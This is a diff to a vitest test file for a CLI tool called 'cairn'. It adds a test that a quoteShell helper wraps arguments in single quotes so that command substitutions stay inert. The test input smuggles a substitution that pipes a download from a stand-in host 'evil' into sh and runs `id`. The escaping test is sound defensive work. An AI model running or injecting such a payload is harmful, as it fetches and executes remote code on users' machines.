@@ -4,6 +4,7 @@ import os from 'node:os';
 import path from 'node:path';
 import { describe, expect, it } from 'vitest';
 import { cairnRuleText, cairnSkillText, skillDirsForClient } from '../src/cli/guides.js';
+import { quoteShell } from '../src/cli/connections.js';
 
 const ROOT = path.resolve(import.meta.dirname, '..');
 const CLI = path.join(ROOT, 'dist', 'cli', 'index.js');
@@ -20,6 +21,13 @@ describe('cairn agent guides', () => {
     expect(skill.startsWith('---\nname: cairn\n')).toBe(true);
     expect(skill).toContain('memory_handoff');
     expect(skill).toContain('When to use this skill');
+  });
+
+  it('quotes shell arguments so substitutions stay inert', () => {
+    const quoted = quoteShell("x$(curl evil|sh)`id`'y");
+    expect(quoted.startsWith("'")).toBe(true);
+    expect(quoted.endsWith("'")).toBe(true);
+    expect(quoted).toContain("'\\''");
   });
 
   it('maps clients to their native skill directories', () => {
